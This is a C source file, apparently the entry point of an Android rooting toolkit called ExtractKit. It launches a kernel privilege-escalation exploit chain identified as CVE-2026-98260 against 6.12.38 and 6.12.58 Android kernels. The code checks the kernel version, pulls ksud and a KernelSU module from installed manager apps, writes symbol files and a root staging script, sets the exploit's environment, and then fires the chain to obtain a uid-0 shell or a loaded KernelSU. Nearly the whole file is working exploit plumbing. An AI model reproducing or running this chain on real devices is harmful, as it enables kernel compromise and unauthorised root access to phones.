/*
 * ExtractKit 6.12 payload entry.
 *
 * The 6.12 branch ships the upstream CVE-2026-98260 D stage (its launcher +
 * libmagicroot.so), linked into a single static executable instead of a
 * launcher plus a shared object, so the app only has to push one file.
 *
 * Dispatch is upstream's (launcher.c):
 *   argv[0] == ""      -> return 42 (the exec'ing timer thread exits quietly)
 *   argv[1] == "wait"  -> cve98260_wait()
 *   otherwise          -> cve98260_main()
 * plus the two words the app's generic runner uses:
 *   check / selftest   -> answer from static facts only, never fire
 *   fake               -> the same as no argument (full chain, no shell)
 *
 * Before the chain runs, the KernelSU stages that upstream does in run.sh
 * (extract ksud + <kmi>_kernelsu.ko from the installed manager, pick the
 * 6.12 ko-syms, stage root_stage.sh) are done here in C, so no extra file has
 * to be pushed.  Everything is best-effort: if the prep cannot be done the
 * chain still runs and yields the plain uid-0 shell.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "ekassets.h"

extern int cve98260_main(int argc, char **argv);
extern int cve98260_wait(int shell_mode);

#define EK_MAX(a, b) ((a) > (b) ? (a) : (b))

static void eklog(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    fflush(stdout);
}

static long ek_size(const char *p)
{
    struct stat st;

    if (stat(p, &st) != 0)
        return -1;
    return (long)st.st_size;
}

static int ek_write_file(const char *p, const char *data, size_t len, mode_t mode)
{
    int fd = open(p, O_WRONLY | O_CREAT | O_TRUNC, mode);
    size_t off = 0;

    if (fd < 0) {
        eklog("[!] 98260: open %s failed errno=%d\n", p, errno);
        return -1;
    }
    while (off < len) {
        ssize_t n = write(fd, data + off, len - off);

        if (n <= 0) {
            eklog("[!] 98260: write %s failed errno=%d\n", p, errno);
            close(fd);
            return -1;
        }
        off += (size_t)n;
    }
    close(fd);
    (void)chmod(p, mode);
    return 0;
}

static int ek_copy_file(const char *src, const char *dst, mode_t mode)
{
    char buf[65536];
    int in = open(src, O_RDONLY | O_CLOEXEC);
    int out;
    ssize_t n;

    if (in < 0) {
        eklog("[!] 98260: open %s failed errno=%d\n", src, errno);
        return -1;
    }
    out = open(dst, O_WRONLY | O_CREAT | O_TRUNC, mode);
    if (out < 0) {
        eklog("[!] 98260: create %s failed errno=%d\n", dst, errno);
        close(in);
        return -1;
    }
    while ((n = read(in, buf, sizeof(buf))) > 0) {
        char *p = buf;
        ssize_t left = n;

        while (left > 0) {
            ssize_t w = write(out, p, (size_t)left);

            if (w <= 0) {
                eklog("[!] 98260: write %s failed errno=%d\n", dst, errno);
                close(in);
                close(out);
                return -1;
            }
            p += w;
            left -= w;
        }
    }
    close(in);
    close(out);
    if (n < 0) {
        eklog("[!] 98260: read %s failed errno=%d\n", src, errno);
        return -1;
    }
    (void)chmod(dst, mode);
    return 0;
}

/* Run a shell command, keep the first line of output, return the exit code. */
static int ek_shell(const char *cmd, char *out, size_t cap)
{
    FILE *f = popen(cmd, "r");
    int rc;

    if (!f)
        return -1;
    out[0] = 0;
    if (fgets(out, (int)cap, f)) {
        size_t n = strlen(out);

        while (n && (out[n - 1] == '\n' || out[n - 1] == '\r'))
            out[--n] = 0;
    }
    rc = pclose(f);
    if (rc == -1)
        return -1;
    if (WIFEXITED(rc))
        return WEXITSTATUS(rc);
    return -1;
}

static int ek_workdir(char *out, size_t cap)
{
    ssize_t n = readlink("/proc/self/exe", out, cap - 1);
    char *slash;

    if (n <= 0)
        return -1;
    out[n] = 0;
    slash = strrchr(out, '/');
    if (!slash)
        return -1;
    *slash = 0;
    return 0;
}

static int ek_kernel(char *out, size_t cap)
{
    struct utsname u;

    if (uname(&u) != 0)
        return -1;
    snprintf(out, cap, "%s", u.release);
    return 0;
}

/*
 * The 6.12 branch only ever loads on the releases upstream profiled.  A
 * different kernel keeps the plain cred-write chain (uid-0 shell) and says so.
 */
static int ek_prep_ksu(const char *wd)
{
    static const char *pkgs[] = {
        "me.weishu.kernelsu", "com.derq31.kernelsu", "com.king.kernelsu",
        "com.sukisu.nova", "com.sukisu.ultra", NULL,
    };
    char krel[256], line[2048], lib[PATH_MAX], cmd[PATH_MAX * 3];
    char ksud[PATH_MAX], ko[PATH_MAX], syms[PATH_MAX], script[PATH_MAX];
    const char *mark;
    const char *symdata;
    int andr = -1, maj = -1, min = -1, i;

    if (ek_kernel(krel, sizeof(krel)) != 0) {
        eklog("[!] 98260: uname failed\n");
        return -1;
    }
    if (strncmp(krel, "6.12.38-", 8) != 0 && strncmp(krel, "6.12.58-", 8) != 0) {
        eklog("[!] 98260: %s is not one of the 6.12 profiles (6.12.38/6.12.58); "
              "keeping the plain uid-0 shell\n", krel);
        return -1;
    }
    mark = strstr(krel, "-android");
    if (!mark)
        return -1;
    (void)sscanf(mark + 8, "%d", &andr);
    if (sscanf(krel, "%d.%d", &maj, &min) != 2) {
        eklog("[!] 98260: cannot parse %s\n", krel);
        return -1;
    }
    if (andr < 0) {
        eklog("[!] 98260: cannot parse the android level of %s\n", krel);
        return -1;
    }

    snprintf(ksud, sizeof(ksud), "%s/ksud", wd);
    snprintf(ko, sizeof(ko), "%s/kernelsu.ko", wd);
    snprintf(script, sizeof(script), "%s/root_stage.sh", wd);

    for (i = 0; pkgs[i]; i++) {
        snprintf(cmd, sizeof(cmd), "pm path %s 2>/dev/null", pkgs[i]);
        if (ek_shell(cmd, line, sizeof(line)) != 0 || strncmp(line, "package:", 8) != 0)
            continue;
        {
            char *apk = line + 8;
            char *libdir;

            snprintf(lib, sizeof(lib), "%s", apk);
            libdir = strrchr(lib, '/');
            if (!libdir)
                continue;
            *libdir = 0;
            snprintf(libdir, (size_t)(sizeof(lib) - (size_t)(libdir - lib)),
                     "/lib/arm64/libksud.so");
            if (ek_size(lib) <= 0) {
                snprintf(libdir, (size_t)(sizeof(lib) - (size_t)(libdir - lib)),
                         "/lib/arm64-v8a/libksud.so");
                if (ek_size(lib) <= 0)
                    continue;
            }
            if (ek_copy_file(lib, ksud, 0755) != 0)
                continue;
            ++i;
            break;
        }
    }
    if (ek_size(ksud) <= 0) {
        eklog("[!] 98260: no manager with lib/arm64/libksud.so found\n");
        return -1;
    }
    eklog("[*] 98260: ksud <- manager (%ld B)\n", ek_size(ksud));

    snprintf(cmd, sizeof(cmd),
             "%s debug extract-binary android%d-%d.%d_kernelsu.ko %s >%s/extract.log 2>&1",
             ksud, andr, maj, min, ko, wd);
    (void)ek_shell(cmd, line, sizeof(line));
    if (ek_size(ko) <= 0) {
        eklog("[!] 98260: ksud extract-binary failed (see %s/extract.log)\n", wd);
        return -1;
    }
    eklog("[*] 98260: kernelsu.ko <- manager (%ld B) kmi=android%d-%d.%d\n",
          ek_size(ko), andr, maj, min);

    if (strncmp(krel, "6.12.38-", 8) == 0) {
        symdata = EK_SYMS_61238;
        snprintf(syms, sizeof(syms), "%s/ko-syms-6.12.38.txt", wd);
    } else if (strstr(krel, "-gdf8d34") != 0) {
        symdata = EK_SYMS_DF8D34;
        snprintf(syms, sizeof(syms), "%s/ko-syms-6.12.58-df8d34.txt", wd);
    } else {
        symdata = EK_SYMS_61258;
        snprintf(syms, sizeof(syms), "%s/ko-syms-6.12.58.txt", wd);
    }
    if (ek_write_file(syms, symdata, strlen(symdata), 0644) != 0)
        return -1;

    if (ek_write_file(script, EK_ROOT_STAGE_SH, strlen(EK_ROOT_STAGE_SH), 0755) != 0)
        return -1;

    setenv("CVE_KSU_MODE", "1", 1);
    setenv("CVE_KSU_KO", ko, 1);
    snprintf(cmd, sizeof(cmd), "%s/ksu-patched.ko", wd);
    setenv("CVE_KSU_PATCHED", cmd, 1);
    setenv("CVE_KSU_SYMS", syms, 1);
    setenv("CVE_KREL", krel, 1);
    setenv("CVE_KSUD", ksud, 1);
    setenv("CVE_ROOT_SCRIPT", script, 1);
    snprintf(cmd, sizeof(cmd), "%s/PARKED", wd);
    setenv("CVE_PARKED_FILE", cmd, 1);
    eklog("[*] 98260: ksu stage armed (ko=%s syms=%s)\n", ko, syms);
    return 0;
}

/* Static facts only: this must never touch the bug. */
static int ek_check(void)
{
    char krel[256];
    long page = sysconf(_SC_PAGESIZE);
    int ready = 1;

    if (ek_kernel(krel, sizeof(krel)) != 0)
        return 3;
    eklog("[check] kernel=%s page=%ld\n", krel, page);
    if (page != 4096) {
        eklog("[check] page size is not 4096\n");
        ready = 0;
    }
    if (strncmp(krel, "6.12.38-", 8) != 0 && strncmp(krel, "6.12.58-", 8) != 0) {
        eklog("[check] %s has no 98260 profile\n", krel);
        ready = 0;
    }
    if (access("/sys/kernel/tracing", W_OK) != 0 && access("/sys/kernel/debug/tracing", W_OK) != 0) {
        eklog("[check] no writable tracefs\n");
        ready = 0;
    }
    eklog("[check] %s\n", ready ? "READY" : "NOT-READY");
    return ready ? 0 : 3;
}

int main(int argc, char **argv)
{
    char wd[PATH_MAX];
    int rc;

    setvbuf(stdout, NULL, _IOLBF, 0);
    if (argc > 0 && argv[0] && argv[0][0] == '\0')
        return 42;
    if (argc > 1 && !strcmp(argv[1], "wait"))
        return cve98260_wait(argc > 2 && !strcmp(argv[2], "shell"));
    if (argc > 1 && (!strcmp(argv[1], "check") || !strcmp(argv[1], "selftest")))
        return ek_check();

    if (!getenv("CVE_KSU_MODE")) {
        if (ek_workdir(wd, sizeof(wd)) != 0)
            snprintf(wd, sizeof(wd), "/data/local/tmp");
        if (ek_prep_ksu(wd) != 0)
            eklog("[!] 98260: KernelSU prep failed; the chain continues and "
                  "yields the plain uid-0 shell\n");
    }
    if (argc > 1 && !strcmp(argv[1], "fake"))
        argc = 1;

    rc = cve98260_main(argc, argv);
    if (rc == 0) {
        eklog("[+] ksu ready\n");
        eklog("KSU_LOADED\n");
    } else {
        eklog("[-] 98260 chain rc=%d\n", rc);
    }
    return rc;
}
